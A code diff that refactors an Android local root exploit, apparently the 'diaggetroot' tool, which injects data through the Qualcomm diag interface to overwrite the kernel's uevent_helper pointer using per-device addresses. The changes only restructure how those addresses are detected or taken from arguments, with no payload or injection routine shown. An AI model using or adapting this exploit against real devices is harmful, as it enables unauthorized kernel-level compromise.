@@ -103,15 +103,15 @@ inject_getroot_command_with_fd(unsigned int uevent_helper_address,
 }
 
 static bool
-inject_uevent_helper(unsigned int uevent_helper_address,
-                     unsigned int delayed_rsp_id_address)
+inject_uevent_helper(diag_injection_addresses *injection_addresses)
 {
   struct values data[400];
   int data_length;
 
-  data_length = prepare_injection_data(data, sizeof(data), uevent_helper_address);
+  data_length = prepare_injection_data(data, sizeof(data),
+                                       injection_addresses->uevent_helper_address);
 
-  return inject(data, data_length, delayed_rsp_id_address) == 0;
+  return inject(data, data_length, injection_addresses->delayed_rsp_id_address) == 0;
 }
 
 jboolean
@@ -133,9 +133,8 @@ usage()
   printf("\tdiaggetroot [uevent_helper address] [delayed_rsp_id address]\n");
 }
 
-#define NOT_SUPPORTED -1
-static int
-detect_device(void)
+static bool
+detect_injection_addresses(diag_injection_addresses *injection_addresses)
 {
   int i;
   char device[PROP_VALUE_MAX];
@@ -147,36 +146,35 @@ detect_device(void)
   for (i = 0; i < n_supported_devices; i++) {
     if (!strcmp(device, supported_devices[i].device) &&
         !strcmp(build_id, supported_devices[i].build_id)) {
-        return i;
+      injection_addresses->uevent_helper_address =
+        supported_devices[i].uevent_helper_address;
+      injection_addresses->delayed_rsp_id_address =
+        supported_devices[i].delayed_rsp_id_address;
+        return true;
     }
   }
   printf("%s (%s) is not supported.\n", device, build_id);
 
-  return NOT_SUPPORTED;
+  return false;
 }
 
 int
 main (int argc, char **argv)
 {
-  int ret;
-  unsigned long int uevent_helper;
-  unsigned long int delayed_rsp_id;
+  diag_injection_addresses injection_addresses;
 
   if (argc != 3) {
     int supported_device_index;
-    supported_device_index = detect_device();
-    if (supported_device_index == NOT_SUPPORTED) {
+    if (!detect_injection_addresses(&injection_addresses)) {
       usage();
       exit(EXIT_FAILURE);
     }
-    uevent_helper = supported_devices[supported_device_index].uevent_helper_address;
-    delayed_rsp_id = supported_devices[supported_device_index].delayed_rsp_id_address;
+  } else {
+    injection_addresses.uevent_helper_address = strtoul(argv[1], NULL, 16);
+    injection_addresses.delayed_rsp_id_address = strtoul(argv[2], NULL, 16);
   }
 
-  uevent_helper = strtoul(argv[1], NULL, 16);
-  delayed_rsp_id = strtoul(argv[2], NULL, 16);
-
-  if (!inject_uevent_helper(uevent_helper, delayed_rsp_id)) {
+  if (!inject_uevent_helper(&injection_addresses)) {
     exit(EXIT_FAILURE);
   }
 
